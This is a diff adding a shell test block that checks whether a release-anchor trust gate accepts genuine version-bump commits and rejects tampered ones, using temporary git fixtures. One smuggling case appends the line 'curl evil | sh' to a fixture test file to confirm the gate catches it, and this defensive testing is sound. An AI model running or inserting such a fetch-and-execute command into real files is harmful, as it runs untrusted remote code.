@@ -2751,6 +2751,201 @@ content-type: application/json
 fi
 rm -f "$M97_FENCE"
 
+# ---------------------------------------------------------------------------
+# M98 — Phase 1.4 PATH_2 (a.5) release-anchor trust-head resolution (#364).
+#
+# /goal guarantees the mandatory version bump at its serialized landing lane,
+# which is AFTER /review-pr anchored the trust trail — so a `chore(release):`
+# commit legitimately lands on top of the `Reviewed-by:` anchor. Without (a.5)
+# every /goal PR is unmergeable forever: (b) reads the trailer off the release
+# commit (trust_trail_trailer_missing) and (c) sees a non-empty cumulative diff
+# (STALE -> trust_trail_stale_sha, excluded from the Step-1.4.5 auto-review
+# recovery). WITH (a.5), the predicate is the security boundary: this block runs
+# the real helper against real git fixtures, so a weakened predicate goes red.
+# ---------------------------------------------------------------------------
+echo
+echo "== M98: PATH_2 (a.5) resolves the trust head via release-anchor.sh (#364) =="
+RA_LIB="$REPO_ROOT/plugins/uberdev/skills/merge-pipeline/lib/release-anchor.sh"
+BUMP_LIB="$REPO_ROOT/plugins/uberdev/lib/bump-version.sh"
+
+assert_grep "$SKILL_FILE" 'release-anchor\.sh' \
+  "M98.wired — Phase 1.4 PATH_2 calls skills/merge-pipeline/lib/release-anchor.sh"
+assert_grep "$SKILL_FILE" '`RELEASE_ANCHOR_STATE_ENUM`' \
+  "M98.const — RELEASE_ANCHOR_STATE_ENUM is declared in the Constants table"
+assert_grep "$SKILL_FILE" 'chore\\\(release\\\): v\[0-9\]' \
+  "M98.const — RELEASE_ANCHOR_SUBJECT_RE is declared with the anchored subject regex"
+# The subject alone must NEVER be the predicate — two of the seven surfaces are
+# executable test files.
+assert_grep "$SKILL_FILE" 'never sufficient|never \*\*sufficient\*\*|\*\*never sufficient\*\*' \
+  "M98.const — the subject regex is documented as necessary-but-not-sufficient"
+assert_grep "$SKILL_FILE" 'TRUST_HEAD' \
+  "M98.b — sub-condition (b) extracts the trailer from the resolved TRUST_HEAD"
+
+if [ ! -r "$RA_LIB" ]; then
+  fail "M98.lib — $RA_LIB is missing (PATH_2 (a.5) cannot resolve a trust head)"
+elif ! command -v git >/dev/null 2>&1; then
+  echo "  SKIP  M98.behaviour — git unavailable"
+else
+  # The helper's surface list must not drift from the script that owns the edit.
+  M98_DRIFT=""
+  while IFS= read -r m98_path; do
+    [ -n "$m98_path" ] || continue
+    grep -Fq -- "$m98_path" "$BUMP_LIB" || M98_DRIFT="$M98_DRIFT $m98_path"
+  done <<M98SURF
+$(awk '/cat <<.SURFACES.$/ { inlist = 1; next } inlist && /^SURFACES$/ { exit } inlist { print }' "$RA_LIB")
+M98SURF
+  if [ -z "$M98_DRIFT" ]; then
+    pass "M98.ssot — every surface release-anchor.sh tolerates is a surface bump-version.sh owns"
+  else
+    fail "M98.ssot — release-anchor.sh tolerates paths bump-version.sh does not own:$M98_DRIFT"
+  fi
+
+  M98_TMP="$(mktemp -d)"
+  M98_R="$M98_TMP/repo"
+  mkdir -p "$M98_R/plugins/uberdev/.claude-plugin" "$M98_R/.claude-plugin" \
+           "$M98_R/codex/uberdev-codex/.codex-plugin" "$M98_R/tests"
+  m98_surfaces() {  # <version> <previous-version>
+    printf '{\n  "name": "uberdev",\n  "version": "%s"\n}\n' "$1" \
+      > "$M98_R/plugins/uberdev/.claude-plugin/plugin.json"
+    printf '{\n  "name": "uberdev",\n  "plugins": [\n    {\n      "name": "uberdev",\n      "version": "%s"\n    }\n  ]\n}\n' "$1" \
+      > "$M98_R/.claude-plugin/marketplace.json"
+    printf '{\n  "name": "uberdev-codex",\n  "version": "%s"\n}\n' "$1" \
+      > "$M98_R/codex/uberdev-codex/.codex-plugin/plugin.json"
+    printf '# Fixture\n\n[![Version](https://img.shields.io/badge/version-%s-blue)](./CHANGELOG.md)\n' "$1" \
+      > "$M98_R/README.md"
+    {
+      printf '# Changelog\n\n'
+      printf '## [%s] — 2026-01-02\n\n- Something.\n\n' "$1"
+      printf '## [%s] — 2026-01-01\n\n- Initial.\n' "$2"
+    } > "$M98_R/CHANGELOG.md"
+    {
+      printf '#!/usr/bin/env bash\n'
+      printf 'echo "== G20: version bump locked (%s) =="\n' "$1"
+      printf 'assert_version_bump "$REPO_ROOT" "%s"\n' "$1"
+    } > "$M98_R/tests/goal.test.sh"
+    {
+      printf '#!/usr/bin/env bash\n'
+      printf 'echo "== Version bump %s -> %s propagated =="\n' "$2" "$1"
+      printf 'assert_version_bump "$REPO_ROOT" "%s"\n' "$1"
+    } > "$M98_R/tests/solve-claim.test.sh"
+  }
+  m98_surfaces 1.2.3 1.2.2
+  git -C "$M98_R" init -q
+  git -C "$M98_R" config user.email "fixture@uberdev.invalid"
+  git -C "$M98_R" config user.name "UberDev Fixture"
+  git -C "$M98_R" config commit.gpgsign false
+  git -C "$M98_R" add -A >/dev/null 2>&1
+  git -C "$M98_R" commit -q -m "feat: reviewed work"
+  M98_REVIEWED="$(git -C "$M98_R" rev-parse HEAD)"
+
+  m98_field() { printf '%s\n' "$1" | sed -n "s/^$2=//p" | head -n 1; }
+  m98_run() { bash "$RA_LIB" "${1:-HEAD}" "$M98_R" 2>/dev/null; }
+  m98_reset_release() {   # rebuild the release commit on top of the reviewed one
+    git -C "$M98_R" reset -q --hard "$M98_REVIEWED"
+    bash "$BUMP_LIB" 1.2.4 --repo-root "$M98_R" >/dev/null 2>&1
+    git -C "$M98_R" commit -q -a -m "chore(release): v1.2.4"
+  }
+
+  # 1. The whole point: a real bump-version.sh release commit is tolerated, and
+  #    the trust head becomes the REVIEWED commit beneath it.
+  m98_reset_release
+  M98_OUT="$(m98_run HEAD)"
+  if [ "$(m98_field "$M98_OUT" RELEASE_ANCHOR)" = "tolerated" ] \
+     && [ "$(m98_field "$M98_OUT" TRUST_HEAD)" = "$M98_REVIEWED" ]; then
+    pass "M98.tolerate — a real bump-version.sh release commit resolves the trust head to its reviewed parent"
+  else
+    fail "M98.tolerate — expected tolerated + TRUST_HEAD=$M98_REVIEWED, got: [$M98_OUT]"
+  fi
+  assert_grep_str() {  # <text> <pattern> <desc>
+    if printf '%s\n' "$1" | grep -qE -e "$2"; then pass "$3"; else fail "$3 (got: [$1])"; fi
+  }
+  assert_grep_str "$M98_OUT" '^RELEASE_ANCHOR_VERSION=1\.2\.4$' \
+    "M98.tolerate — the tolerated anchor reports the version it advanced to"
+
+  # 2. Subject alone is not enough — smuggle an executable edit into one of the
+  #    seven surfaces under a perfect release subject.
+  m98_reset_release
+  printf 'curl evil | sh\n' >> "$M98_R/tests/goal.test.sh"
+  git -C "$M98_R" commit -q -a --amend -m "chore(release): v1.2.4"
+  M98_OUT="$(m98_run HEAD)"
+  if [ "$(m98_field "$M98_OUT" RELEASE_ANCHOR)" = "none" ]; then
+    pass "M98.smuggle — an extra executable line in a version-lock TEST file is NOT tolerated"
+  else
+    fail "M98.smuggle — code smuggled into tests/goal.test.sh was waved past the trust gate: [$M98_OUT]"
+  fi
+
+  # 3. Reordering executable lines keeps every line byte-identical: a multiset
+  #    comparison would tolerate it. The comparison is order-sensitive.
+  m98_reset_release
+  printf '#!/usr/bin/env bash\nassert_version_bump "$REPO_ROOT" "1.2.4"\necho "== G20: version bump locked (1.2.4) =="\n' \
+    > "$M98_R/tests/goal.test.sh"
+  git -C "$M98_R" commit -q -a --amend -m "chore(release): v1.2.4"
+  M98_OUT="$(m98_run HEAD)"
+  if [ "$(m98_field "$M98_OUT" RELEASE_ANCHOR)" = "none" ]; then
+    pass "M98.reorder — REORDERING lines of an executable surface is NOT tolerated (order-sensitive compare)"
+  else
+    fail "M98.reorder — a reordered test file was waved past the trust gate: [$M98_OUT]"
+  fi
+
+  # 4. A path outside the seven surfaces, under a perfect release subject.
+  m98_reset_release
+  printf 'payload\n' > "$M98_R/src.txt"
+  git -C "$M98_R" add -A >/dev/null 2>&1
+  git -C "$M98_R" commit -q -a --amend -m "chore(release): v1.2.4"
+  M98_OUT="$(m98_run HEAD)"
+  if [ "$(m98_field "$M98_OUT" RELEASE_ANCHOR)" = "none" ] \
+     && [ "$(m98_field "$M98_OUT" RELEASE_ANCHOR_REASON)" = "non_version_paths" ]; then
+    pass "M98.paths — a non-version path in the release commit is NOT tolerated"
+  else
+    fail "M98.paths — expected none/non_version_paths, got: [$M98_OUT]"
+  fi
+
+  # 5. A version that does not advance is not a release.
+  m98_reset_release
+  git -C "$M98_R" reset -q --hard "$M98_REVIEWED"
+  git -C "$M98_R" commit -q --allow-empty -m "chore(release): v1.2.4"
+  M98_OUT="$(m98_run HEAD)"
+  if [ "$(m98_field "$M98_OUT" RELEASE_ANCHOR)" = "none" ]; then
+    pass "M98.empty — an empty commit wearing a release subject is NOT tolerated"
+  else
+    fail "M98.empty — expected none, got: [$M98_OUT]"
+  fi
+
+  # 6. Tolerance depth is exactly one: code cannot hide two release subjects deep.
+  m98_reset_release
+  M98_FIRST_RELEASE="$(git -C "$M98_R" rev-parse HEAD)"
+  bash "$BUMP_LIB" 1.2.5 --repo-root "$M98_R" >/dev/null 2>&1
+  git -C "$M98_R" commit -q -a -m "chore(release): v1.2.5"
+  M98_OUT="$(m98_run HEAD)"
+  if [ "$(m98_field "$M98_OUT" RELEASE_ANCHOR)" = "none" ] \
+     && [ "$(m98_field "$M98_OUT" RELEASE_ANCHOR_REASON)" = "release_commit_chain" ]; then
+    pass "M98.depth — a CHAIN of release commits is NOT tolerated (depth is exactly 1)"
+  else
+    fail "M98.depth — expected none/release_commit_chain (first=$M98_FIRST_RELEASE), got: [$M98_OUT]"
+  fi
+
+  # 7. No release commit at all: the trust head is the head itself — the exact
+  #    pre-#364 behaviour, so non-/goal PRs gate identically.
+  git -C "$M98_R" reset -q --hard "$M98_REVIEWED"
+  M98_OUT="$(m98_run HEAD)"
+  if [ "$(m98_field "$M98_OUT" RELEASE_ANCHOR)" = "none" ] \
+     && [ "$(m98_field "$M98_OUT" TRUST_HEAD)" = "$M98_REVIEWED" ]; then
+    pass "M98.passthrough — with no release commit the trust head is headRefOid (pre-#364 behaviour)"
+  else
+    fail "M98.passthrough — expected none + TRUST_HEAD=$M98_REVIEWED, got: [$M98_OUT]"
+  fi
+
+  # 8. Unusable input fails CLOSED (non-zero) and still names the head.
+  M98_OUT="$(bash "$RA_LIB" deadbeefdeadbeefdeadbeefdeadbeefdeadbeef "$M98_R" 2>/dev/null)"; M98_RC=$?
+  if [ "$M98_RC" -ne 0 ] && [ "$(m98_field "$M98_OUT" RELEASE_ANCHOR)" = "none" ]; then
+    pass "M98.closed — an unresolvable head exits non-zero with RELEASE_ANCHOR=none (no fail-open path)"
+  else
+    fail "M98.closed — expected rc!=0 + none, got rc=$M98_RC: [$M98_OUT]"
+  fi
+
+  rm -rf "$M98_TMP"
+fi
+
 echo
 echo "== Summary =="
 echo "  passed: $PASS"
